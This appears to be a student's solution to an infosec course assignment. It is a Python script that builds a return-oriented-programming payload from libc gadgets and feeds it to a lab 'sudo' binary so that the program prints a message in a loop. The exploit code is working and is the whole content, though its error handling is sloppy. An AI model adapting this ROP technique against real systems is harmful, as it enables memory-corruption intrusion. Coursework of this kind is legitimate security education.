import os
import sys
import base64
import struct
import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) password argument to be sent to
    the sudo program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a bytes object and not an
    str object.

    NOTES:
    1. Use addresses.PUTS to get the address of the puts function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    check_pass_esp_addr = 0xbfffe074
    check_pass_add_esp = addresses.address_to_bytes(check_pass_esp_addr+28)
    jmp = addresses.address_to_bytes(check_pass_esp_addr+8)
    puts_address = addresses.address_to_bytes(addresses.PUTS)
    string_address = get_string("315441972").encode('latin-1')

    # Find gadgets
    try:
        pop_ebp_addr = search.find('pop ebp')
        pop_ebp_bytes = addresses.address_to_bytes(pop_ebp_addr)
        print(f'found pop ebp at {hex(pop_ebp_addr)}')
    except:
        print(f'dont found pop ebp at ')
    try:
        pop_esp_addr = search.find('pop esp')
        pop_esp_bytes = addresses.address_to_bytes(pop_esp_addr)
        print(f'found pop esp at {hex(pop_esp_addr)}')
    except:
        print(f'dont found pop ebp at ')

    try:
        add_esp_4_addr = search.find('add esp, 4')
        add_esp_4_bytes = addresses.address_to_bytes(add_esp_4_addr)
        print(f'Found add esp, 4; ret at {hex(add_esp_4_addr)}')
    except:
        print(f'dont found add esp, 4')



    # Construct the payload
    payload = 131 * b'\x01'
    #payload += pop_ebp_bytes
    payload += puts_address
    payload += puts_address
    payload += add_esp_4_bytes
    payload += check_pass_add_esp
    payload += pop_esp_bytes
    payload += jmp
    payload += string_address
    payload += b'\x00'

   
    return payload
def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts bytes as well as str, so we will use bytes.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
